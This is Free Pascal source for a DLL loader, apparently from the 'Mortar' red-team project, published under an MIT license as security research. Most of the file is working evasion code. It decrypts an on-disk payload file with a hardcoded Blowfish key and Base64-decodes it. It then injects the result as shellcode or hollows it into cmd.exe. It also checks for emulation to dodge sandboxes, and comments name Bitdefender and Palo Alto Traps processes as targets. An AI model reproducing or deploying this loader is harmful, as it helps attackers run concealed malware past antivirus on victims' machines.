library agressor;

 {
 ===========================================
 MIT License

Copyright (c) 2021 0xsp security research and development

  Title : customized Dll libary for Mortar technique
  Author : 0xsp.com @zux0x3a


  the author of this module is not responsible for any misuse of this code or similair copied code, the source code and compiled binaries
  are published for the security researching only.
  the technique has been presented in online conference before the release and well-detailed paper has been posted online to help open-source community to build
  enhanced security solutions.

 ===============================================================

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.




 }

{$mode objfpc}{$H+}

uses
  Classes, windows, blowfish, runner, SysUtils,base64, shell_loader,
  strutils, syscalls;


const
 // key for decryption
 MASTER_KEY:array[0..9] of BYTE = ($7a,$75,$78,$69,$61,$6d,$68,$65,$72,$61);



 function Base64ToStream(var ABase64:widestring; const AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
 var
   InStream: TStringStream;
   Decoder: TBase64DecodingStream;
 begin


 Result := False;
 InStream := TStringStream.Create(ABase64);
   try
     if AStrict then
       Decoder := TBase64DecodingStream.Create(InStream, bdmStrict)
     else
       Decoder := TBase64DecodingStream.Create(InStream, bdmMIME);
     try
       AOutStream.Seek(0,sofrombeginning);

        AOutStream.CopyFrom(decoder,decoder.Size);

        Result := True;
     finally
       Decoder.Free;
     end;
   finally
     InStream.Free;
   end;
 end;

procedure SH_Decryptor;
var
  de :TBlowFishDeCryptStream;
  s2: TStringStream;
  key:rawbytestring;

  AMemStr,MS: TMemoryStream;
  AStrStr: TStringStream;
  list_c : Tstringlist;

  outp,l_file,in_log:string;
  temp: widestring;
begin

l_file := getcurrentdir+'\bin.enc';

  AMemStr := TMemoryStream.Create;
  MS := Tmemorystream.Create;
  list_c := Tstringlist.Create;



  Amemstr.LoadFromFile(l_file);
  AmemStr.Write(outp[1],length(outp) * sizeof(outp[1]));
 AMemStr.Position := 0;

  //copy MemoryStream to StringStream
  AStrStr := TStringStream.Create('');

  AStrStr.Size := AMemStr.Size;
  AStrStr.CopyFrom(AMemStr, AMemStr.Size);
  AStrStr.Position := 0;

  key := TEncoding.UTF8.GetString(MASTER_KEY);


  s2 := TStringStream.Create(AStrStr.DataString);
  de := TBlowFishDeCryptStream.Create(key,s2);
  AStrStr.Free;
  SetLength(temp,s2.Size);
  de.Read(temp[1],s2.Size);



  Base64ToStream(temp,MS,false);
  Ms.Position:=0;
  list_c.LoadFromStream(MS);

  in_log := convertshellcode(list_c.text);

   inject_shell(in_log);


  Amemstr.Free;
  list_c.Free;

  end;


function bin_decryptor(input:string):widestring;
var
  de :TBlowFishDeCryptStream;
  str_strm: TStringStream;
  key:rawbytestring;
  AMemStr, AMemStr2: TMemoryStream;
  AStrStr: TStringStream;
  processhandle:thandle;
  outp,url:string;
   temp:widestring;

begin

url := getcurrentdir+'\bin.enc';   // place the encrypted binary in same folder

  AMemStr := TMemoryStream.Create;
 AMemStr.LoadFromFile(url);
  AmemStr.Write(outp[1],length(outp) * sizeof(outp[1]));
 AMemStr.Position := 0;

  //copy MemoryStream to StringStream
  AStrStr := TStringStream.Create('');
  AStrStr.Size := AMemStr.Size;
  AStrStr.CopyFrom(AMemStr, AMemStr.Size);
  AStrStr.Position := 0;

  key := TEncoding.UTF8.GetString(MASTER_KEY); // getting string value of array of bytes.


  str_strm := TStringStream.Create(AStrStr.DataString);
  de := TBlowFishDeCryptStream.Create(key,str_strm);
  AStrStr.Free;
  SetLength(temp,str_strm.Size);

  de.Read(temp[1],str_strm.Size);
  sleep(1);
  AMemStr2 := TMemoryStream.Create;
  Base64tostream(temp,Amemstr2,false);

  fork_P_x64(input,runner.TByteArray(AMemStr2.memory),processhandle);

  AMemStr2.Free;
  Amemstr.Free;

  end;

procedure start; stdcall;

begin

  {
   for bitdefender C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe
   for palo-alto C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe

  }
if isEmulated = true  then
  exit
  else
    bin_decryptor('c:\\windows\\system32\\cmd.exe');

end;


procedure sh; stdcall;

begin
if isEmulated = true  then
  exit
  else
SH_Decryptor;

end;

exports start,
        sh;


begin
  {
  is emulated technique is still rock =:>
  }

  if isEmulated = true  then
    exit
    else
    //  sleep(10000);
      exit;

end.

